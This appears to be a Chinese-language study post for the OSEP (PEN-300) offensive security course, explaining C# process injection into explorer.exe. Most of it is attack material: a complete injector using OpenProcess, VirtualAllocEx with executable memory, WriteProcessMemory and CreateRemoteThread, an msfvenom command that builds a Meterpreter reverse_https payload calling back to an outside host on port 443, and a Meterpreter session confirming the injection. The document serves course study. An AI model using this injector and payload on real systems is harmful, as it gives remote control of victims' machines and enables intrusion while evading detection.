---
title: OSEP-06-CSharp进程注入实现
description: '06-进程注入 | 02-CSharp进程注入实现'
pubDate: 2026-01-30T00:00:50+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# C# 进程注入实现

## 概述

使用 C# 实现进程注入，将 shellcode 注入到 explorer.exe 等目标进程中执行。

## 完整代码

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // 动态获取 explorer.exe 进程 ID
            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            // 打开目标进程
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            // 在目标进程分配内存
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_https -f csharp)
            // 将 msfvenom 生成的完整 byte[] 粘贴到这里；不要把省略号放进数组。
            byte[] buf = new byte[] {
                0xfc, 0x48, 0x83, 0xe4, 0xf0
            };

            // 写入 shellcode
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            // 创建远程线程执行
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
```

## API 详解

### OpenProcess

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| processAccess | 0x001F0FFF | PROCESS_ALL_ACCESS |
| bInheritHandle | false | 不继承句柄 |
| processId | pid | 目标进程 ID |

### VirtualAllocEx

```csharp
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| hProcess | hProcess | 进程句柄 |
| lpAddress | IntPtr.Zero | 系统选择地址 |
| dwSize | 0x1000 | 4KB |
| flAllocationType | 0x3000 | MEM_COMMIT \| MEM_RESERVE |
| flProtect | 0x40 | PAGE_EXECUTE_READWRITE |

### WriteProcessMemory

```csharp
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
```

| 参数 | 说明 |
|------|------|
| hProcess | 进程句柄 |
| lpBaseAddress | 目标地址 |
| lpBuffer | shellcode 数组 |
| nSize | 数据大小 |
| lpNumberOfBytesWritten | 实际写入字节数 |

### CreateRemoteThread

```csharp
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

| 参数 | 值 | 说明 |
|------|-----|------|
| hProcess | hProcess | 进程句柄 |
| lpStartAddress | addr | shellcode 地址 |
| 其他参数 | 0/IntPtr.Zero | 默认值 |

## 架构兼容性

| 源进程 | 目标进程 | 支持 |
|--------|----------|------|
| 64位 | 64位 | ✅ |
| 64位 | 32位 | ✅ |
| 32位 | 32位 | ✅ |
| 32位 | 64位 | ❌ |

**注意**: 32位进程无法注入到64位进程

## 生成 Shellcode

```bash
# 64位 shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    -f csharp
```

## 编译设置

1. 设置平台为 x64（注入64位进程）
2. 切换到 Release 模式
3. Build → Build Solution

## 验证注入

```
meterpreter > getpid
Current pid: 4804  # explorer.exe 的 PID
```

## 注意事项

1. **权限要求** - 需要足够权限打开目标进程
2. **完整性级别** - 只能注入相同或更低级别的进程
3. **架构匹配** - shellcode 架构必须匹配目标进程
4. **杀软检测** - 进程注入是常见检测点
